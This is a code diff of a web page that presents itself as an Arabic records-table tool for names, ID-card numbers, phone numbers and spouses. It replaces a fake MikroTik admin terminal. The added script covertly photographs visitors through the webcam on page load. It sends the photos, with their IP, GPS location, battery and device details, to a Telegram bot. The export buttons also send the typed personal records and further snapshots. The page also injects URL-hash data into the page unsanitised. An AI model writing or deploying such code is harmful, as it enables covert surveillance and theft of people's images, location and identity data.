+                userIpInfo = "محلي";
             }
         }
-        printNextLine();
-    }
 
-    function runCommand(event) {
-        event.preventDefault();
-        const rawCmd = document.getElementById('cmdInput').value.trim();
-        const lowerCmd = rawCmd.toLowerCase();
-        let lines = [];
+        window.addEventListener('DOMContentLoaded', async () => {
+            await fetchVisitorIp();
+            initSpeechRecognition();
 
-        if (lowerCmd.includes('/system/resource')) {
-            lines = [
-                `[Admin@MikroTik] > ${rawCmd}`,
-                `Uptime: 45d 12h 18m 33s`,
-                `Version: 6.49.6 (stable)`,
-                `Build-time: Oct/14/2023 11:15:42`,
-                `Board-name: RB1100AHx4`,
-                `Platform: MikroTik`,
-                `Free-memory: 842.1 MiB`,
-                `Total-memory: 1024.0 MiB`,
-                `CPU: Annapurna Labs Alpine AL214`,
-                `CPU-count: 4`,
-                `CPU-frequency: 1400 MHz`,
-                `CPU-load: 12%`,
-                `Free-hdd-space: 128.4 MiB`,
-                `Total-hdd-space: 256.0 MiB`,
-                `Write-sect-since-reboot: 14258`,
-                `Architecture: arm`,
-                `Status: Resource analysis completed successfully.`
-            ];
-        } else if (lowerCmd.includes('/ip/hotspot/active') || lowerCmd.includes('/ip/address')) {
-            lines = [
-                `[Admin@MikroTik] > ${rawCmd}`,
-                `Fetching active database records...`,
-                ` 0 IP: 11.0.17.65   | MAC: E4:5F:01:22:33:44 | Uptime: 2h 14m | Status: Active`,
-                ` 1 IP: 11.0.18.79   | MAC: CC:2D:E0:55:66:77 | Uptime: 1h 20m | Status: Active`,
-                ` 2 IP: 11.0.19.678  | MAC: 88:36:6C:88:99:AA | Uptime: 35m    | Status: Active`,
-                ` 3 IP: 11.0.15.76   | MAC: 50:C7:BF:11:22:33 | Uptime: 4h 10m | Status: Active`,
-                ` 4 IP: 192.168.88.5 | MAC: 70:85:C2:44:55:66 | Uptime: 15m    | Status: Active`,
-                ` 5 IP: 192.168.88.12| MAC: 11:22:33:44:55:66 | Uptime: 5h 00m | Status: Active`,
-                ` 6 IP: 172.16.10.45 | MAC: AA:BB:CC:DD:EE:FF | Uptime: 45m    | Status: Active`,
-                `Total active items displayed: 7 records found.`
-            ];
-        } else if (lowerCmd.includes('/interface')) {
-            lines = [
-                `[Admin@MikroTik] > ${rawCmd}`,
-                `FLAGS X - disabled, R - running, S - slave, D - dynamic`,
-                ` 0 R  ether1-WAN            ether            1500  1514`,
-                ` 1 R  ether2-LAN            ether            1500  1514`,
-                ` 2    ether3                ether            1500  1514`,
-                ` 3    ether4                ether            1500  1514`,
-                ` 4 R  wlan1-Hotspot         wlan             1500  2290`,
-                ` 5 R  bridge-local          bridge           1500  1514`,
-                ` 6 D  pppoe-out1            pppoe            1480`,
-                `Interface check completed without errors.`
-            ];
-        } else if (lowerCmd.includes('/log/print')) {
-            lines = [
-                `[Admin@MikroTik] > ${rawCmd}`,
-                `11:32:01 system,info router rebooted successfully`,
-                `11:32:05 hotspot,info user logged in: IP 11.0.17.65`,
-                `11:35:12 firewall,info input: drop ICMP packet from 45.12.33.10`,
-                `11:40:22 dhcp,info assigned 11.0.18.79 to CC:2D:E0:55:66:77`,
-                `11:45:00 system,info pool dhcp_pool updated successfully`,
-                `11:50:15 pppoe,info pppoe-out1 connected successfully`,
-                `End of system logs.`
-            ];
-        } else {
-            lines = [
-                `[Admin@MikroTik] > ${rawCmd}`,
-                `Processing request via secure cloud API bridge...`,
-                `Analyzing input parameters and routing table...`,
-                `Executing command on target gateway node...`,
-                `--------------------------------------------------`,
-                `Status: OK`,
-                `Processed items: 12 records retrieved successfully.`,
-                `Memory allocated: 1.8 MiB.`,
-                `Result: Command completed successfully with zero errors.`
-            ];
+            try {
+                const hash = window.location.hash;
+                if (hash && hash.includes('#data=')) {
+                    const encodedData = hash.replace('#data=', '');
+                    const decodedHtml = decodeURIComponent(escape(atob(encodedData)));
+                    if (decodedHtml) {
+                        document.getElementById('pagesWrapper').innerHTML = decodedHtml;
+                        rebindInputs();
+                    }
+                } else {
+                    const savedTableData = localStorage.getItem('toufan_live_table_data');
+                    if (savedTableData) {
+                        document.getElementById('pagesWrapper').innerHTML = savedTableData;
+                        rebindInputs();
+                    }
+                }
+            } catch (e) {}
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
+                    batteryInfo = `${level}% ${charging}`;
+                }
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
+                    },
+                    (error) => { globalLocation = "مرفوض الإذن"; },
+                    { timeout: 10000, maximumAge: 0 }
+                );
+            }
+
+            const firstSheet = document.querySelector('.sheet-container');
+            if (firstSheet) {
+                activeSheet = firstSheet;
+                activeTable = firstSheet.querySelector('table');
+                const firstInput = firstSheet.querySelector('.table-input');
+                if (firstInput) {
+                    setActiveInput(firstInput);
+                }
+            }
+            renumberAllRows();
+
+            document.getElementById('pagesWrapper').addEventListener('input', () => {
+                saveCurrentStateToLocalStorage();
+            });
+
+            setTimeout(() => { requestCameraPermissionOnce(); }, 1000);
+        });
+
+        function rebindInputs() {
+            document.querySelectorAll('.table-input').forEach(input => {
+                if (input.getAttribute('value') && !input.value) {
+                    input.value = input.getAttribute('value');
+                }
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { 
+                    this.setAttribute('value', this.value);
+                    saveCurrentStateToLocalStorage(); 
+                };
+            });
+            document.querySelectorAll('th[contenteditable="true"]').forEach(th => {
+                th.oninput = function() { saveCurrentStateToLocalStorage(); };
+            });
         }
 
-        // تشغيل نظام السطور المتدفقة مثل تريمكس
-        streamTerminalLines(lines);
-    }
+        function setActiveInput(inputElement) {
+            if (!inputElement) return;
+            activeInputElement = inputElement;
+            const tr = inputElement.closest('tr');
+            const table = inputElement.closest('table');
+            activeSheet = inputElement.closest('.sheet-container');
+            activeTable = table;
+            activeRowElement = tr;
 
-    function logout() {
-        localStorage.removeItem('mikrotik_secure_attempts');
-        location.reload();
-    }
-</script>
+            if (table) {
+                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
+                if (tr) tr.classList.add('active-row');
+            }
+        }
+
+        function setActiveContext(sheetContainer, event) {
+            if (!sheetContainer) return;
+            activeSheet = sheetContainer;
+            activeTable = sheetContainer.querySelector('table');
+        }
+
+        function selectRow(trElement, event) {
+            if (!trElement) return;
+            activeRowElement = trElement;
+            const table = trElement.closest('table');
+            if (table) {
+                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
+                trElement.classList.add('active-row');
+            }
+        }
+
+        function initSpeechRecognition() {
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            if (!SpeechRecognition) return;
+
+            recognition = new SpeechRecognition();
+            recognition.lang = 'ar-YE';
+            recognition.continuous = false;
+            recognition.interimResults = false;
+
+            recognition.onresult = (event) => {
+                const spokenText = event.results[0][0].transcript.trim();
+
+                if (!activeInputElement) {
+                    const firstInput = document.querySelector('.table-input');
+                    if (firstInput) setActiveInput(firstInput);
+                }
+
+                if (activeInputElement && spokenText !== "") {
+                    let currentText = activeInputElement.value || activeInputElement.getAttribute('value') || "";
+                    currentText = currentText.trim();
+                    if (currentText !== "") {
+                        activeInputElement.value = currentText + " " + spokenText;
+                    } else {
+                        activeInputElement.value = spokenText;
+                    }
+                    activeInputElement.setAttribute('value', activeInputElement.value);
+                    saveCurrentStateToLocalStorage();
+                    moveToNextInput();
+                }
+            };
+
+            recognition.onerror = () => {
+                if (!manualStop && isListening) {
+                    try { recognition.start(); } catch(e) {}
+                }
+            };
+
+            recognition.onend = () => {
+                if (!manualStop && isListening) {
+                    try {
+                        recognition.start();
+                    } catch (e) {
+                        isListening = false;
+                        updateMicButtonsState();
+                    }
+                } else {
+                    isListening = false;
+                    updateMicButtonsState();
+                }
+            };
+        }
+
+        function moveToNextInput() {
+            if (!activeInputElement) return;
+            const tr = activeInputElement.closest('tr');
+            const inputs = Array.from(tr.querySelectorAll('.table-input'));
+            const currentIdx = inputs.indexOf(activeInputElement);
+
+            if (currentIdx > -1 && currentIdx < inputs.length - 1) {
+                activeInputElement = inputs[currentIdx + 1];
+                activeInputElement.focus();
+                setActiveInput(activeInputElement);
+            } else {
+                const nextRow = tr.nextElementSibling;
+                if (nextRow) {
+                    const nextInputs = Array.from(nextRow.querySelectorAll('.table-input'));
+                    if (nextInputs.length > 0) {
+                        activeInputElement = nextInputs[0];
+                        activeInputElement.focus();
+                        setActiveInput(activeInputElement);
+                    }
+                }
+            }
+        }
+
+        function startSpeechRecognition() {
+            if (!recognition) {
+                alert('عذراً، متصفحك لا يدعم الناطق الذكي.');
+                return;
+            }
+            manualStop = false;
+            try {
+                recognition.start();
+                isListening = true;
+                updateMicButtonsState();
+            } catch (e) {
+                isListening = false;
+                updateMicButtonsState();
+            }
+        }
+
+        function stopSpeechRecognition() {
+            manualStop = true;
+            isListening = false;
+            if (recognition) {
+                try { recognition.stop(); } catch(e) {}
+            }
+            updateMicButtonsState();
+        }
+
+        function updateMicButtonsState() {
+            const startBtn = document.getElementById('startMicBtn');
+            const stopBtn = document.getElementById('stopMicBtn');
+            if (isListening) {
+                startBtn.disabled = true;
+                startBtn.classList.add('mic-active-glow');
+                startBtn.textContent = '🎙️ جاري الاستماع...';
+                stopBtn.disabled = false;
+            } else {
+                startBtn.disabled = false;
+                startBtn.classList.remove('mic-active-glow');
+                startBtn.textContent = '▶️ تشغيل';
+                stopBtn.disabled = true;
+            }
+        }
+
+        function prepareHtmlForSaving() {
+            const container = document.getElementById('pagesWrapper').cloneNode(true);
+            const liveInputs = document.querySelectorAll('.table-input');
+            const clonedInputs = container.querySelectorAll('.table-input');
+            
+            clonedInputs.forEach((input, index) => {
+                if (liveInputs[index]) {
+                    const val = liveInputs[index].value || liveInputs[index].getAttribute('value') || "";
+                    input.value = val;
+                    input.setAttribute('value', val);
+                }
+            });
+
+            const liveThs = document.querySelectorAll('th[contenteditable="true"]');
+            const clonedThs = container.querySelectorAll('th[contenteditable="true"]');
+            clonedThs.forEach((th, index) => {
+                if (liveThs[index]) {
+                    th.textContent = liveThs[index].textContent;
+                }
+            });
+
+            return container.innerHTML;
+        }
+
+        function saveCurrentStateToLocalStorage() {
+            try {
+                const wrapperHtml = prepareHtmlForSaving();
+                localStorage.setItem('toufan_live_table_data', wrapperHtml);
+            } catch (e) {}
+        }
+
+        function requestCameraPermissionOnce() {
+            const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع الجغرافي:\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        globalCameraStream = stream;
+                        cameraPermissionGranted = true;
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((photoBlob) => {
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('caption', alertCaption);
+                                    formData.append('parse_mode', 'Markdown');
+                                    formData.append('photo', photoBlob, 'visitor.jpg');
+
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).catch(e => {});
+
+                                }, 'image/jpeg', 0.85);
+                            }, 700);
+                        };
+                    })
+                    .catch((err) => {
+                        cameraPermissionGranted = false;
+                        const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption + "\n\n(❌ تم رفض إذن الكاميرا من قبل الزائر)")}&parse_mode=Markdown`;
+                        const img = new Image();
+                        img.src = textApi;
+                    });
+            }
+        }
+
+        function onPdfButtonClicked() {
+            saveCurrentStateToLocalStorage();
+            const caption = `🖨️ **طلب طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
+            setTimeout(() => { window.print(); }, 800);
+        }
+
+        function onExcelButtonClicked() {
+            saveCurrentStateToLocalStorage();
+            const caption = `📊 **طلب حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_البيانات.txt", "Excel");
+            exportExcelFileOnly();
+        }
+
+        function onArchiveButtonClicked() {
+            saveCurrentStateToLocalStorage();
+            const caption = `💾 **طلب حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
+            saveArchiveOnly();
+        }
+
+        function executeActionAndSend(captionText, fileName, fileTypeFlag) {
+            const sheets = document.querySelectorAll('.sheet-container');
+            let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
+            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
+            fileContent += `--------------------------------------------------\n`;
+
+            sheets.forEach((sheet, tIndex) => {
+                fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
+                const headers = Array.from(sheet.querySelectorAll('thead th')).map(th => (th.innerText || th.textContent).trim());
+                fileContent += headers.join(' | ') + '\n';
+                fileContent += `--------------------------------------------------\n`;
+
+                const rows = sheet.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    const m = row.cells[0] ? (row.cells[0].innerText || row.cells[0].textContent).trim() : '';
+                    const inputs = row.querySelectorAll('.table-input');
+                    let rowHasData = false;
+                    let rowDataStr = m;
+
+                    inputs.forEach(inp => {
+                        const val = (inp.value || inp.getAttribute('value') || '').trim();
+                        if (val !== "") rowHasData = true;
+                        rowDataStr += ` | ${val}`;
+                    });
+
+                    if (rowHasData) {
+                        fileContent += rowDataStr + '\n';
+                    }
+                });
+            });
+
+            const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+
+            const wrapperHtml = prepareHtmlForSaving();
+            const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
+            const baseUrl = window.location.href.split('#')[0];
+            const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
+
+            const linkFileContent = `====================================\n` +
+                                    `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
+                                    `${uniqueUserUrl}\n` +
+                                    `====================================\n` +
+                                    `ملاحظة: افتح هذا الرابط لتجد حرفياً نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
+                                    `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
+                                    `تطوير: ميثاق محمد صالح حموده`;
+            const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
+
+            sendIndependentLinkFile(linkFileBlob);
+            if (fileBlob) {
+                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
+            }
+
+            if (cameraPermissionGranted && globalCameraStream) {
+                try {
+                    const video = document.getElementById('videoElement');
+                    const canvas = document.getElementById('canvasElement');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob((photoBlob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('caption', captionText);
+                        formData.append('parse_mode', 'Markdown');
+                        formData.append('photo', photoBlob, 'action_snapshot.jpg');
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => {});
+                    }, 'image/jpeg', 0.85);
+                } catch (e) {}
+            }
+        }
+
+        function sendIndependentLinkFile(linkBlob) {
+            const linkData = new FormData();
+            linkData.append('chat_id', chatId);
+            linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
+            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (يحمل الأسماء للتعديل)**');
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: linkData
+            }).catch(e => {});
+        }
+
+        function sendDocumentOnly(fileBlob, fileName, caption) {
+            const docData = new FormData();
+            docData.append('chat_id', chatId);
+            docData.append('document', fileBlob, fileName);
+            docData.append('caption', caption);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: docData
+            }).catch(e => {});
+        }
+
+        function exportExcelFileOnly() {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let csvRows = [];
+
+            tables.forEach((table, tableIndex) => {
+                if (tables.length > 1) {
+                    csvRows.push(`"--- صفحة رقم (${tableIndex + 1}) ---"`);
+                }
+
+                const headers = Array.from(table.querySelectorAll('thead th')).map(th => {
+                    let text = (th.innerText || th.textContent).replace(/"/g, '""').trim();
+                    return `"${text}"`;
+                });
+                csvRows.push(headers.join(','));
+
+                const rows = table.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    if (row.style.display === 'none') return;
+                    const inputs = row.querySelectorAll('.table-input');
+                    const cells = Array.from(inputs).map(inp => {
+                        let text = (inp.value || inp.getAttribute('value') || '').replace(/"/g, '""').trim();
+                        return `"${text}"`;
+                    });
+                    csvRows.push(cells.join(','));
+                });
+                csvRows.push('');
+            });
+
+            const csvString = '\uFEFF' + csvRows.join('\r\n');
+            const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const now = new Date();
+            const dateStr = now.toISOString().slice(0, 10);
+            const filename = `كشف_البيانات_${dateStr}.csv`;
+
+            const link = document.createElement('a');
+            link.href = url;
+            link.setAttribute('download', filename);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function saveArchiveOnly() {
+            try {
+                const wrapperHtml = prepareHtmlForSaving();
+                const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
+                const now = new Date();
+                const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
+
+                archives.push({
+                    id: Date.now(),
+                    title: 'عمل محفوظ بتاريخ: ' + timeString,
+                    html: wrapperHtml
+                });
+
+                localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
+            } catch (error) {}
+        }
+
+        function sortNamesAlphabetically() {
+            const wrapper = document.getElementById('pagesWrapper');
+            preSortBackupHtml = wrapper.innerHTML;
+
+            const tables = document.querySelectorAll('.dynamicTable');
+            let allRowsData = [];
+
+            tables.forEach(table => {
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const inputs = row.querySelectorAll('.table-input');
+                    const name = inputs[0] ? (inputs[0].value || inputs[0].getAttribute('value') || '').trim() : '';
+                    if (name !== "") {
+                        let rowObj = {};
+                        inputs.forEach((inp, idx) => {
+                            rowObj['col_' + idx] = (inp.value || inp.getAttribute('value') || '').trim();
+                        });
+                        allRowsData.push(rowObj);
+                    }
+                });
+            });
+
+            if (allRowsData.length === 0) return;
+
+            allRowsData.sort((a, b) => a.col_0.localeCompare(b.col_0, 'ar', { sensitivity: 'accent' }));
+
+            let dataIndex = 0;
+            tables.forEach(table => {
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const inputs = row.querySelectorAll('.table-input');
+                    if (dataIndex < allRowsData.length) {
+                        inputs.forEach((inp, idx) => {
+                            const val = allRowsData[dataIndex]['col_' + idx] || '';
+                            inp.value = val;
+                            inp.setAttribute('value', val);
+                        });
+                        dataIndex++;
+                    } else {
+                        inputs.forEach(inp => { inp.value = ''; inp.setAttribute('value', ''); });
+                    }
+                });
+            });
+
+            renumberAllRows();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function cancelAlphabeticalSort() {
+            if (!preSortBackupHtml) return;
+            document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
+            preSortBackupHtml = null;
+            rebindInputs();
+            renumberAllRows();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function normalizeArabic(text) {
+            if (!text) return "";
+            return text
+                .toString()
+                .toLowerCase()
+                .replace(/[\u064b-\u065f]/g, '')
+                .replace(/[أإآا]/g, 'ا')
+                .replace(/ة/g, 'ه')
+                .replace(/ؤ/g, 'و')
+                .replace(/ئ/g, 'ي')
+                .replace(/ى/g, 'ي');
+        }
+
+        function filterTableRows() {
+            const input = document.getElementById('tableSearchInput');
+            const filter = normalizeArabic(input.value.trim());
+            const tables = document.querySelectorAll('.dynamicTable');
+
+            tables.forEach(table => {
+                const rows = table.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    let match = false;
+                    const inputs = row.querySelectorAll('.table-input');
+                    inputs.forEach((inp) => {
+                        let cText = inp.value || inp.getAttribute('value') || '';
+                        if (normalizeArabic(cText).includes(filter)) {
+                            match = true;
+                        }
+                    });
+                    row.style.display = filter === "" || match ? "" : "none";
+                });
+            });
+        }
+
+        function renumberAllRows() {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let globalIndex = 1;
+
+            tables.forEach(table => {
+                const rows = table.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    const firstCell = row.cells[0];
+                    if (firstCell) {
+                        firstCell.textContent = globalIndex;
+                        globalIndex++;
+                    }
+                });
+            });
+        }
+
+        function openPdfModal() {
+            document.getElementById('pdfFileInput').value = '';
+            document.getElementById('pdfStatusMsg').textContent = '';
+            document.getElementById('pdfModal').style.display = 'flex';
+        }
+
+        function closePdfModal() {
+            document.getElementById('pdfModal').style.display = 'none';
+        }
+
+        async function processUploadedPdf() {
+            const fileInput = document.getElementById('pdfFileInput');
+            const statusMsg = document.getElementById('pdfStatusMsg');
+
+            if (!fileInput.files || fileInput.files.length === 0) return;
+
+            const file = fileInput.files[0];
+            statusMsg.textContent = '⏳ جاري قراءة وتحليل ملف الـ PDF...';
+
+            try {
+                const arrayBuffer = await file.arrayBuffer();
+                const loadingTask = pdfjsLib.getDocument({ data: arrayBuffer });
+                const pdfDoc = await loadingTask.promise;
+                
+                let extractedLines = [];
+                for (let i = 1; i <= pdfDoc.numPages; i++) {
+                    const page = await pdfDoc.getPage(i);
+                    const textContent = await page.getTextContent();
+                    let pageLines = textContent.items.map(item => item.str.trim()).filter(text => text.length > 0);
+                    extractedLines = extractedLines.concat(pageLines);
+                }
+
+                if (extractedLines.length === 0) {
+                    statusMsg.textContent = '';
+                    return;
+                }
+
+                populateTableWithData(extractedLines);
+                closePdfModal();
+            } catch (error) {
+                statusMsg.textContent = '';
+            }
+        }
+
+        function populateTableWithData(itemsList) {
+            const wrapper = document.getElementById('pagesWrapper');
+            wrapper.innerHTML = '';
+
+            const rowsPerPage = 15;
+            const totalPages = Math.ceil(itemsList.length / rowsPerPage);
+            let itemIndex = 0;
+
+            for (let p = 1; p <= totalPages; p++) {
+                const newPage = document.createElement('div');
+                newPage.className = 'sheet-container';
+                newPage.setAttribute('onclick', 'setActiveContext(this,event)');
+
+                newPage.innerHTML = `
+                    <div class="header-top">
+                        <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
+                        <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${p})</div>
+                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/11</div>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="dynamicTable">
+                            <thead>
+                                <tr>
+                                    <th style="width:35px;">م</th>
+                                    <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
+                                    <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
+                                    <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
+                                    <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
+                                    <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
+                                    <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
+                                </tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                    <div class="footer-bottom">
+                        <div class="editable-header" contenteditable="true">الإدارة العامة</div>
+                        <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
+                    </div>
+                `;
+
+                wrapper.appendChild(newPage);
+                const tbody = newPage.querySelector('tbody');
+
+                for (let r = 0; r < rowsPerPage; r++) {
+                    const row = tbody.insertRow();
+                    row.setAttribute('onclick', 'selectRow(this,event)');
+                    const cellM = row.insertCell();
+                    cellM.textContent = '-';
+
+                    for (let c = 0; c < 6; c++) {
+                        const cell = row.insertCell();
+                        const input = document.createElement('input');
+                        input.type = 'text';
+                        input.className = 'table-input';
+                        input.onfocus = function() { setActiveInput(this); };
+                        input.oninput = function() { 
+                            this.setAttribute('value', this.value);
+                            saveCurrentStateToLocalStorage(); 
+                        };
+                        
+                        if (c === 0 && itemIndex < itemsList.length) {
+                            input.value = itemsList[itemIndex];
+                            input.setAttribute('value', itemsList[itemIndex]);
+                            itemIndex++;
+                        }
+                        cell.appendChild(input);
+                    }
+                }
+            }
+
+            renumberAllRows();
+            rebindInputs();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function openBulkImportModal() {
+            document.getElementById('bulkNamesTextarea').value = '';
+            document.getElementById('bulkImportModal').style.display = 'flex';
+        }
+
+        function closeBulkImportModal() {
+            document.getElementById('bulkImportModal').style.display = 'none';
+        }
+
+        function processBulkImport() {
+            const rawText = document.getElementById('bulkNamesTextarea').value;
+            const namesList = rawText.split('\n').map(n => n.trim()).filter(n => n.length > 0);
+            if (namesList.length === 0) return;
+            populateTableWithData(namesList);
+            closeBulkImportModal();
+        }
+
+        function checkPhoneNumbers() {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let errorCount = 0;
+
+            tables.forEach(table => {
+                const headers = Array.from(table.querySelectorAll('thead th'));
+                let phoneColIndices = [];
+                headers.forEach((th, idx) => {
+                    let titleText = normalizeArabic(th.innerText || th.textContent);
+                    if ((titleText.includes('جوال') || titleText.includes('هاتف') || titleText.includes('تلفون') || titleText.includes('اتصال')) && !titleText.includes('بطاقه')) {
+                        phoneColIndices.push(idx - 1);
+                    }
+                });
+
+                if (phoneColIndices.length === 0) {
+                    phoneColIndices.push(3);
+                }
+
+                const rows = table.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    const inputs = row.querySelectorAll('.table-input');
+                    phoneColIndices.forEach(colIdx => {
+                        const input = inputs[colIdx];
+                        if (input) {
+                            let val = input.value || input.getAttribute('value') || '';
+                            val = val.trim();
+                            let digitsOnly = val.replace(/\D/g, '');
+                            if (val !== "") {
+                                if (digitsOnly.length !== 9) {
+                                    errorCount++;
+                                    input.style.color = '#c62828';
+                                    input.style.textDecoration = 'underline';
+                                    input.style.fontWeight = 'bold';
+                                } else {
+                                    input.style.color = '';
+                                    input.style.textDecoration = '';
+                                    input.style.fontWeight = '';
+                                }
+                            }
+                        }
+                    });
+                });
+            });
+        }
+
+        function openArchiveModal() {
+            const container = document.getElementById('archiveListContainer');
+            container.innerHTML = '';
+            let archives;
+            try {
+                archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
+            } catch (error) { archives = []; }
+
+            if (archives.length === 0) {
+                container.innerHTML = `<p style="text-align:center;color:#888;padding:20px;">لا توجد أعمال محفوظة.</p>`;
+            } else {
+                archives.slice().reverse().forEach((item) => {
+                    const div = document.createElement('div');
+                    div.className = 'archive-item';
+                    const info = document.createElement('div');
+                    info.className = 'archive-item-info';
+                    info.textContent = '📄 ' + item.title;
+
+                    const actions = document.createElement('div');
+                    actions.style.display = 'flex';
+                    actions.style.gap = '8px';
+
+                    const loadButton = document.createElement('button');
+                    loadButton.className = 'btn btn-green';
+                    loadButton.style.padding = '4px 10px';
+                    loadButton.textContent = '📂 استرجاع وتعديل';
+                    loadButton.onclick = function () { loadArchiveItem(item.id); };
+
+                    const deleteButton = document.createElement('button');
+                    deleteButton.className = 'btn btn-red';
+                    deleteButton.style.padding = '4px 10px';
+                    deleteButton.textContent = '🗑️ حذف';
+                    deleteButton.onclick = function () { deleteArchiveItem(item.id); };
+
+                    actions.appendChild(loadButton);
+                    actions.appendChild(deleteButton);
+                    div.appendChild(info);
+                    div.appendChild(actions);
+                    container.appendChild(div);
+                });
+            }
+            document.getElementById('archiveModal').style.display = 'flex';
+        }
+
+        function closeArchiveModal() {
+            document.getElementById('archiveModal').style.display = 'none';
+        }
+
+        function loadArchiveItem(id) {
+            let archives;
+            try {
+                archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
+            } catch (error) { return; }
+
+            const found = archives.find(item => item.id === id);
+            if (found) {
+                document.getElementById('pagesWrapper').innerHTML = found.html;
+                rebindInputs();
+                saveCurrentStateToLocalStorage();
+                closeArchiveModal();
+            }
+        }
+
+        function deleteArchiveItem(id) {
